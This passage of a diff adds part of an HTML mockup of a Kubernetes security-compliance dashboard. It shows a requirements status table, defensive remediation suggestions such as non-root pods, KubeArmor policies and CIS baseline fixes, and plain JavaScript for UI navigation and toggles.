+              <td><span style="color:#059669;font-weight:700">&#x2713;</span></td>
+            </tr>
+            <tr>
+              <td><code>FR-32</code></td>
+              <td>可信启动与完整性</td>
+              <td><span class="badge badge-p1">P1</span></td>
+              <td>3</td>
+              <td style="color:#059669;font-weight:600">2</td>
+              <td style="color:#dc2626;font-weight:600">1</td>
+              <td><span style="color:#d97706;font-weight:700">&#x26a0;&#xfe0f;</span></td>
+            </tr>
+            <tr>
+              <td><code>FR-33</code></td>
+              <td>关键文件防篡改</td>
+              <td><span class="badge badge-p1">P1</span></td>
+              <td>4</td>
+              <td style="color:#059669;font-weight:600">3</td>
+              <td style="color:#dc2626;font-weight:600">1</td>
+              <td><span style="color:#d97706;font-weight:700">&#x26a0;&#xfe0f;</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Panel 4: 优先修复建议 -->
+    <div class="app-panel-warm">
+      <div class="panel-header">
+        <div>
+          <div class="panel-eyebrow">Remediation Priority</div>
+          <div class="panel-title">优先修复建议</div>
+        </div>
+        <button class="btn-primary btn-sm">生成修复计划</button>
+      </div>
+
+      <div class="fix-item">
+        <div class="fix-priority p0">P0</div>
+        <div class="fix-info">
+          <div class="fi-fr">FR-29</div>
+          <div class="fi-desc">启用 Pod SecurityContext — <code>runAsNonRoot</code>, <code>drop ALL capabilities</code>，防止容器以 root 身份运行并限制权限提升</div>
+        </div>
+      </div>
+
+      <div class="fix-item">
+        <div class="fix-priority p0">P0</div>
+        <div class="fix-info">
+          <div class="fi-fr">FR-29</div>
+          <div class="fi-desc">部署 KubeArmor <code>filelessExec</code> + <code>protectEnv</code> 预设策略，阻止无文件执行和进程环境变量泄露</div>
+        </div>
+      </div>
+
+      <div class="fix-item">
+        <div class="fix-priority p0">P0</div>
+        <div class="fix-info">
+          <div class="fi-fr">FR-30</div>
+          <div class="fi-desc">修复 15 项基线不合规 (SSH MaxSessions, PAM 密码策略, 文件权限等)，参照 CIS Benchmark 标准</div>
+        </div>
+      </div>
+
+      <div class="fix-item">
+        <div class="fix-priority p1">P1</div>
+        <div class="fix-info">
+          <div class="fi-fr">FR-32</div>
+          <div class="fi-desc">启用 KubeArmor IMA 度量 (<code>enableIMA=true</code>)，实现运行时二进制完整性校验</div>
+        </div>
+      </div>
+
+      <div class="fix-item">
+        <div class="fix-priority p1">P1</div>
+        <div class="fix-info">
+          <div class="fi-fr">FR-33</div>
+          <div class="fi-desc">部署 KubeArmor FIM <code>readOnly</code> 策略到所有命名空间，保护 <code>/bin/</code>, <code>/usr/bin/</code> 等系统关键目录</div>
+        </div>
+      </div>
+
+    </div>
+
+  </div><!-- /content-area -->
+</div><!-- /page-audit -->
+
+
+</div><!-- /main-content -->
+</div><!-- /app-shell -->
+
+<script>
+/* ========== SIDEBAR PAGE NAVIGATION ========== */
+document.querySelectorAll('.nav-item').forEach(function(item) {
+  item.addEventListener('click', function() {
+    var page = this.getAttribute('data-page');
+    if (!page) return;
+    /* Update sidebar active */
+    document.querySelectorAll('.nav-item').forEach(function(n) { n.classList.remove('active'); });
+    this.classList.add('active');
+    /* Show target page */
+    document.querySelectorAll('.page-section').forEach(function(ps) { ps.classList.remove('active'); });
+    var target = document.getElementById('page-' + page);
+    if (target) target.classList.add('active');
+  });
+});
+
+/* ========== TAB SWITCHING ========== */
+document.querySelectorAll('.tab').forEach(function(tab) {
+  tab.addEventListener('click', function() {
+    var tabId = this.getAttribute('data-tab');
+    var tabGroup = this.parentElement.getAttribute('data-tabgroup');
+    if (!tabId) return;
+    /* Update tab active state within same group */
+    this.parentElement.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+    this.classList.add('active');
+    /* Show target tab content within same page section */
+    var pageSection = this.closest('.page-section');
+    if (!pageSection) return;
+    pageSection.querySelectorAll('.tab-content').forEach(function(tc) { tc.classList.remove('active'); });
+    var target = document.getElementById(tabId);
+    if (target) target.classList.add('active');
+  });
+});
+
+/* ========== TOGGLE SWITCHES ========== */
+document.querySelectorAll('.toggle-switch').forEach(function(sw) {
+  sw.addEventListener('click', function() {
+    this.classList.toggle('on');
+  });
+});
+
+/* ========== MODE SELECTORS ========== */
+document.querySelectorAll('.mode-selector').forEach(function(selector) {
+  selector.querySelectorAll('.mode-btn').forEach(function(btn) {
+    btn.addEventListener('click', function() {
+      var classes = this.className;
+      var isEnforce = classes.indexOf('enforce') > -1;
+      var isObserve = classes.indexOf('observe') > -1;
+      selector.querySelectorAll('.mode-btn').forEach(function(b) {
+        b.classList.remove('active', 'enforce', 'observe', 'off');
+      });
+      this.classList.add('active');
+      if (isEnforce) this.classList.add('enforce');
+      else if (isObserve) this.classList.add('observe');
+      else this.classList.add('off');
+    });
+  });
+});
+</script>
+
+</body>
+</html>
